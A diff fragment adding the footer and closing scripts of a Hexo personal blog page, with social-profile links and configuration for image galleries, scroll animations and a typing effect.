+    </li>
+    
+    <li>
+        <a href="https://www.jianshu.com/u/cae76dedc83d" target="_blank">简书</a>
+    </li>
+    
+    <li>
+        <a href="https://www.zhihu.com/people/liu-xiang-qian-28/activities" target="_blank">知乎</a>
+    </li>
+    
+</div>
+            </div>
+        </div>
+    </aside>
+    
+</aside>
+            </div>
+        </div>
+    </div>
+    <footer id="gal-footer">
+    <div class="container">
+        Copyright © 2018 向前!向前! Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
+    </div>
+</footer>
+
+<!-- 回到顶端 -->
+<div id="gal-gotop">
+    <i class="fa fa-angle-up"></i>
+</div>
+</body>
+<script src="/js/activate-power-mode.js"></script>
+<script>
+
+    // 配置highslide
+	hs.graphicsDir = '/js/highslide/graphics/'
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.lang.number = '共%2张图, 当前是第%1张';
+    hs.addSlideshow({
+      interval: 5000,
+      repeat: true,
+      useControls: true,
+      fixedControls: "fit",
+      overlayOptions: {
+        opacity: 0.75,
+        position: "bottom center",
+        hideOnMouseOut: true
+      }
+    })
+
+    // 初始化aos
+    AOS.init({
+      duration: 1000,
+      delay: 0,
+      easing: 'ease-out-back'
+    });
+
+</script>
+<script>
+	POWERMODE.colorful = 'true';    // make power mode colorful
+	POWERMODE.shake = 'true';       // turn off shake
+	// TODO 这里根据具体情况修改
+	document.body.addEventListener('input', POWERMODE);
+</script>
+<script>
+    window.slideConfig = {
+      prefix: '/imgs/slide/background',
+      ext: 'jpg',
+      maxCount: '6'
+    }
+</script>
+<script src="/js/hs.js"></script>
+<script src="/js/blog.js"></script>
+
+<script src="/js/oni.js"></script>
+
+
+
+</html>
